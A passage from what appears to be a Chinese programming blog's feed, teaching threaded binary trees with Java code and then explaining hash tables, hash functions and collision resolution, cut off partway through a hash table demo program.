class="number">2</span> * index + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">2</span> * index + <span class="number">2</span>) &lt; arr.length) &#123;</span><br><span class="line">preOrder(<span class="number">2</span> * index + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线索化二叉树"><a href="#线索化二叉树" class="headerlink" title="线索化二叉树"></a>线索化二叉树</h1><p>线索化二叉树是为了解决无法直接找到该结点在某种遍历次序中的前驱结点和后继结点的问题。</p><p><strong>n个节点的二叉树中含有n+1个空指针域</strong>。利用二叉树中的空指针域来存放在某种遍历次序下的前驱和后继结点的指针，这种指针叫“线索”。这种加上了线索的二叉树称为线索二叉树。线索二叉树可分为前序线索二叉树、中序线索二叉树和后序线索二叉树三种。</p><p>为了知道某一结点的left是指向它的左孩子还是指向前驱结点，我们设置了两个标志域：</p><table><thead><tr><th>leftType</th><th>left</th><th>data</th><th>right</th><th>rightType</th></tr></thead><tbody><tr><td>0表示<strong>left</strong>存放左孩子，1表示存放前驱结点</td><td>存放左孩子或前驱结点</td><td>存放数据</td><td>存放右孩子或后继结点</td><td>0表示<strong>right</strong>存放右孩子，1表示存放后继结点</td></tr></tbody></table><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215715.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree.threadedbinarytree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadedBinaryTreeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 测试一把中序线索二叉树的功能</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">1</span>, <span class="string">&quot;tom&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">3</span>, <span class="string">&quot;jack&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">6</span>, <span class="string">&quot;smith&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">8</span>, <span class="string">&quot;mary&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">10</span>, <span class="string">&quot;king&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">14</span>, <span class="string">&quot;dim&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉树，后面我们要递归创建, 现在简单处理使用手动创建</span></span><br><span class="line">root.setLeft(node2);</span><br><span class="line">root.setRight(node3);</span><br><span class="line">node2.setLeft(node4);</span><br><span class="line">node2.setRight(node5);</span><br><span class="line">node3.setLeft(node6);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试中序线索化</span></span><br><span class="line"><span class="type">ThreadedBinaryTree</span> <span class="variable">threadedBinaryTree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadedBinaryTree</span>();</span><br><span class="line">threadedBinaryTree.setRoot(root);</span><br><span class="line">threadedBinaryTree.threadedNodes();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试: 以10号节点测试</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">leftNode</span> <span class="operator">=</span> node5.getLeft();</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">rightNode</span> <span class="operator">=</span> node5.getRight();</span><br><span class="line">System.out.println(<span class="string">&quot;10号结点的前驱结点是 =&quot;</span> + leftNode); <span class="comment">// 3</span></span><br><span class="line">System.out.println(<span class="string">&quot;10号结点的后继结点是 =&quot;</span> + rightNode); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;使用线索化的方式遍历 线索化二叉树&quot;</span>);</span><br><span class="line">threadedBinaryTree.threadedList(); <span class="comment">// 8, 3, 10, 1, 14, 6</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedBinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> HeroNode root;</span><br><span class="line"><span class="keyword">private</span> <span class="type">HeroNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//在递归进行线索化时，pre 总是保留前一个结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoot</span><span class="params">(HeroNode root)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.root = root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">threadedNodes</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.threadedNodes(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序线索化二叉树</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">threadedNodes</span><span class="params">(HeroNode node)</span> &#123;</span><br><span class="line"><span class="comment">// 如果node==null, 不能线索化</span></span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// (一)先线索化左子树</span></span><br><span class="line">threadedNodes(node.getLeft());</span><br><span class="line"><span class="comment">// (二)线索化当前结点[有难度]</span></span><br><span class="line"><span class="comment">// 处理当前结点的前驱结点</span></span><br><span class="line"><span class="comment">// 以8结点来理解</span></span><br><span class="line"><span class="comment">// 8结点的.left = null , 8结点的.leftType = 1</span></span><br><span class="line"><span class="keyword">if</span> (node.getLeft() == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// 让当前结点的左指针指向前驱结点</span></span><br><span class="line">node.setLeft(pre);</span><br><span class="line"><span class="comment">// 修改当前结点的左指针的类型,指向前驱结点</span></span><br><span class="line">node.setLeftType(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理后继结点</span></span><br><span class="line"><span class="keyword">if</span> (pre != <span class="literal">null</span> &amp;&amp; pre.getRight() == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// 让前驱结点的右指针指向当前结点</span></span><br><span class="line">pre.setRight(node);</span><br><span class="line"><span class="comment">// 修改前驱结点的右指针类型</span></span><br><span class="line">pre.setRightType(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// !!! 每处理一个结点后，让当前结点是下一个结点的前驱结点</span></span><br><span class="line">pre = node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (三)再线索化右子树</span></span><br><span class="line">threadedNodes(node.getRight());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历线索化二叉树的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">threadedList</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 定义一个变量，存储当前遍历的结点，从root开始</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node</span> <span class="operator">=</span> root;</span><br><span class="line"><span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// 循环的找到leftType == 1的结点，第一个找到就是8结点</span></span><br><span class="line"><span class="keyword">while</span> (node.getLeftType() == <span class="number">0</span>) &#123;</span><br><span class="line">node = node.getLeft();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印当前这个结点</span></span><br><span class="line">System.out.println(node);</span><br><span class="line"><span class="comment">// 如果当前结点的右指针指向的是后继结点,就一直输出</span></span><br><span class="line"><span class="keyword">while</span> (node.getRightType() == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 获取到当前结点的后继结点</span></span><br><span class="line">node = node.getRight();</span><br><span class="line">System.out.println(node);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 让node指向该结点的右孩子</span></span><br><span class="line">node = node.getRight();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeroNode</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> HeroNode left;</span><br><span class="line"><span class="keyword">private</span> HeroNode right;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> leftType;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> rightType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HeroNode</span><span class="params">(<span class="type">int</span> no, String name)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNo</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getLeft</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLeft</span><span class="params">(HeroNode left)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.left = left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getRight</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRight</span><span class="params">(HeroNode right)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.right = right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLeftType</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> leftType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLeftType</span><span class="params">(<span class="type">int</span> leftType)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.leftType = leftType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getRightType</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> rightType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRightType</span><span class="params">(<span class="type">int</span> rightType)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.rightType = rightType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;HeroNode [no=&quot;</span> + no + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>散列表</title>
      <link href="/posts/799a/"/>
      <url>/posts/799a/</url>
      
        <content type="html"><![CDATA[<h1 id="散列表"><a href="#散列表" class="headerlink" title="散列表"></a>散列表</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>散列表(Hash table，也叫哈希表)，是根据关键码值(Key value)而直接进行访问的<strong>数据结构</strong>。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。<code>存储位置 = f(key)</code>，这个映射函数叫做散列函数，存放记录的数组叫做散列表。</p><p>散列技术既是一种存储方法，也是一种查找方法。散列技术最适合的求解问题是查找与给定值相等的记录。</p><h2 id="散列冲突"><a href="#散列冲突" class="headerlink" title="散列冲突"></a>散列冲突</h2><p>在理想的情况下，每一个关键码值，通过散列函数计算出来的地址都是不一样的，可现实中，这只是一个理想。我们时常会碰到两个关键字key1 ≠ key2，但是却有f(key1)&#x3D;f(key2)，这种现象我们称为冲突(collision)，并把key1和key2称为这个散列函数的同义词(synonym)。</p><h2 id="散列函数的构造方法"><a href="#散列函数的构造方法" class="headerlink" title="散列函数的构造方法"></a>散列函数的构造方法</h2><p>好的散列函数满足两个原则：1.计算简单  2.散列地址分布均匀</p><p>如果关键字是字符串如何处理？其实无论是英文字符，还是中文字符，也包括各种各样的符号，它们都可以转化为某种数字来对待，比如ASClI码或者Unicode码等，因此也就可以使用下面的这些方法。</p><p>总之，现实中，应该视不同的情况采用不同的散列函数。我们只能给出一些考虑的因素来提供参考：</p><blockquote><ol><li>计算散列地址所需的时间。</li><li>关键字的长度。</li><li>散列表的大小。</li><li>关键字的分布情况。</li><li>记录查找的频率。</li></ol></blockquote><p>综合这些因素，才能决策选择哪种散列函数更合适。</p><hr><h3 id="直接定址法"><a href="#直接定址法" class="headerlink" title="直接定址法"></a>直接定址法</h3><p>取关键字或关键字的某个线性函数为Hash地址，即H(key)&#x3D;key 或者H(key)&#x3D;a*key+b，其中a和b为常数。</p><p>这样的散列函数优点就是简单、均匀，也不会产生冲突，但问题是这需要事先知道关键字的分布情况，适合查找表较小且连续的情况。由于这样的限制，在现实应用中，此方法虽然简单，但却并不常用。</p><h3 id="数字分析法"><a href="#数字分析法" class="headerlink" title="数字分析法"></a>数字分析法</h3><p>假设关键字是r进制数（如十进制数），并且Hash表中可能出现的关键字都是事先知道的，则可选取关键字的若干数位组成Hash地址。选取的原则是使得到的Hash地址尽量减少冲突，即所选数位上的数字尽可能是随机的。</p><blockquote><p>若我们现在要存储某家公司员工登记表，如果用手机号作为关键字，那么极有可能前7位都是相同的。那么我们选择后面的四位成为散列地址就是不错的选择。如果这样的抽取工作还是容易出现冲突问题，还可以对抽取出来的数字再进行反转（如1234改成4321）、右环位移（如1234改成4123）、左环位移、甚至前两数与后两数叠加（如1234改成12+34&#x3D;46）等方法。总的目的就是为了提供一个散列函数，能够合理地将关键字分配到散列表的各位置。</p></blockquote><p>数字分析法通常适合处理关键字位数比较大的情况，如果事先知道关键字的分布且关键字的若干位分布较均匀，就可以考虑用这个方法。</p><h3 id="平方取中法"><a href="#平方取中法" class="headerlink" title="平方取中法"></a>平方取中法</h3><p>取关键字平方后的中间几位作为Hash地址。通常在选定Hash函数的时候不一定能知道关键字的全部情况，仅取其中的几位为地址不一定合适，而一个数平方后的中间几位数和数的每一位都相关，由此得到的Hash地址随机性更大，取的位数由表长决定。</p><p>平方取中法比较适合于不知道关键字的分布，而位数又不是很大的情况。</p><h3 id="折叠法"><a href="#折叠法" class="headerlink" title="折叠法"></a>折叠法</h3><p>折叠法是将关键字从左到右分割成位数相等的几部分（注意最后一部分位数不够时可以短些），然后将这几部分叠加求和，并按散列表表长，取后几位作为散列地址。</p><blockquote><p>比如我们的关键字是9876543210，散列表表长为三位，我们将它分为四组，<br>987|654|321|0，然后将它们叠加求和987+654+321+0&#x3D;1962，再求后3位得到散列地址为962。<br>有时可能这还不能够保证分布均匀，不妨从一端向另一端来回折叠后对齐相加。<br>比如我们将987和321反转，再与654和0相加，变成789+654+123+0&#x3D;1566，此时散列地址为566。</p></blockquote><h3 id="除留余数法-常用"><a href="#除留余数法-常用" class="headerlink" title="除留余数法(常用)"></a>除留余数法(常用)</h3><p>取关键字被某个不大于Hash表表长m的数p除后<strong>所得的余数</strong>为Hash地址，即</p><p>​H（key）&#x3D;key mod p（p≤m）<br>在本方法中，p的选择很重要，一般p选择<strong>小于或者等于表长的最大素数</strong>，这样可以减少冲突。</p><h3 id="随机数法"><a href="#随机数法" class="headerlink" title="随机数法"></a>随机数法</h3><p>选择一个随机数，取关键字的随机函数值为它的散列地址。也就是f（key）&#x3D; random（key）。这里random是随机函数。当关键字的长度不等时，采用这个方法构造散列函数是比较合适的。</p><h2 id="处理散列冲突的方法"><a href="#处理散列冲突的方法" class="headerlink" title="处理散列冲突的方法"></a>处理散列冲突的方法</h2><p>只能尽量减少冲突的发生，不可完全避免冲突。</p><h3 id="开放定址法"><a href="#开放定址法" class="headerlink" title="开放定址法"></a>开放定址法</h3><p><strong>线性探测法：</strong>从发生冲突的地址（设为d）开始，依次探查d的下一个地址（当到达下标为m-1的Hash表表尾时，下一个探查的地址是表首地址0），直到找到一个空位置为止，当m≥n（n是表中关键字的个数）时一定能找到一个空位置。</p><p>它的公式是：<br>                        <code>f（key）=（f（key）+d）MOD m（d=1，2，3，……，m-1）</code></p><p>使用线性探测法会出现不是同义词却需要争夺一个地址的情况，我们称这种现象为<strong>堆积</strong>。堆积会使我们的存入和查找效率降低。</p><hr><p><strong>二次探测法：</strong>也叫平方探测法，可以双向寻找空位置，减少堆积问题的出现。</p><p>它的公式是：<br>                        <code>f（key）=（f（key）+d）MOD m（d=1²，-1²，2²，-2²……，q²,-q²,q&lt;=m/2）</code></p><p>使用二次探测法不能探查到哈希表上的所有单元，但至少能探测到一半的单元。</p><hr><p>此外，开放定址法的探查方法还有伪随机序列法， d&#x3D;<a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0">伪随机数</a>序列</p><h3 id="再散列法"><a href="#再散列法" class="headerlink" title="再散列法"></a>再散列法</h3><p> 再散列法：Hi&#x3D;RHi(key),i&#x3D;1,2，…， RHi均是不同的散列函数，即在同义词产生地址冲突时计算另一个散列函数地址，直到冲突不再发生，这种方法不易产生“聚集”，但增加了计算时间。</p><h3 id="链地址法-常用"><a href="#链地址法-常用" class="headerlink" title="链地址法(常用)"></a>链地址法(常用)</h3><p>链地址法是把所有的同义词用单链表连接起来的方法。在这种方法中，Hash表每个单元中存放的不再是记录本身，而是相应同义词单链表的表头指针。</p><p>链地址法对于可能会造成很多冲突的散列函数来说，提供了绝不会出现找不到地址的保障。当然，这也就带来了查找时需要遍历单链表的性能损耗。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214947.png"></p><h2 id="散列表查找算法实现"><a href="#散列表查找算法实现" class="headerlink" title="散列表查找算法实现"></a>散列表查找算法实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.hashtab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashTabDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建哈希表,链表和数组相结合</span></span><br><span class="line"><span class="type">HashTab</span> <span class="variable">hashTab</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashTab</span>(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;add:  添加雇员&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;list: 显示雇员&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;find: 查找雇员&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;exit: 退出系统&quot;</span>);</span><br><span class="line"></span><br><span class="line">key = scanner.next();</span><br><span class="line"><span class="keyword">switch</span> (key) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;add&quot;</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;输入id&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">System.out.println(<span 